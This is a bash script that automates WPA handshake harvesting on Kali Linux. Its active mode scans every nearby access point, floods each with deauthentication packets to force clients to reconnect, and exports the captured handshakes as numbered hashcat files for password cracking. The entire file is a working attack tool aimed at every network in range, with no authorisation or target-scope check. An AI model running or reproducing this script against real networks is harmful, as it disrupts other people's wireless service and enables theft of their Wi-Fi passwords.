#!/bin/bash

checkHandshakes(){
        echo ""
        echo "Clean cap file.."
        output=`wpaclean /home/kali/cleanshakes.cap /home/kali/shakes-01.cap` #> /dev/null`

        if [[ "$output" == *"Net"* ]]; then
                echo "Handshakes detected!!!"
                if [[ -d /home/kali/shakes ]]
                then

                        if [[ `ls /home/kali/shakes/ | wc -l` -ne 0 ]]; then          
                                lastNum=$(($(head -n 1 /home/kali/shakes/.counter)+1))                                 
                                aircrack-ng -j /home/kali/shakes/shake${lastNum} /home/kali/cleanshakes.cap > /dev/null
                                echo $lastNum > /home/kali/shakes/.counter
                        else                            
                                mkdir /home/kali/shakes/                                                      
                                aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
                                touch /home/kali/shakes/.counter     
                                echo "1" > /home/kali/shakes/.counter
                        fi
                else                           
                        mkdir /home/kali/shakes                                                       
                        aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
                        touch /home/kali/shakes/.counter     
                        echo "1" > /home/kali/shakes/.counter
                fi

        	rm /home/kali/cleanshakes.cap
        else
                echo "No handshakes" 
        fi                    
        rm /home/kali/shakes-*
}

active(){
	trap "rm /home/kali/sha*" EXIT
	airmon-ng check kill
	airmon-ng start wlan1
	echo "Collect AP"
  	timeout 15 airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null 
	counter=0

	while read line
	do
		if [[ $counter -lt 2 ]]
	       	then
			counter=$(($counter + 1 ))
			continue
		fi

		channel=`echo $line | awk '{print $6}'`
		channel=${channel::-1} #delete last ,
		bssid=`echo $line | awk '{print $1}'`
		bssid=${bssid::-1}
		echo $bssid
		echo $channel
		
		iwconfig wlan1 channel $channel
		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 < /dev/null > /dev/null &
		aireplay-ng -a $bssid -0 10 wlan1
		sleep 10
		checkHandshakes

	done < /home/kali/shakes-01.csv

}

passive(){
	trap 'checkHandshakes' EXIT

        airmon-ng check kill
        airmon-ng start wlan1

        echo "Start airodump.."
        airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null
}

if [ $# -lt 1 ]
then
	echo "Please use -a or -p flag"
	exit 1
fi

while getopts "pa" opt
do
	case $opt in
		a)active;;
		p)passive;;
		*)echo "Unknown option"
	esac
done

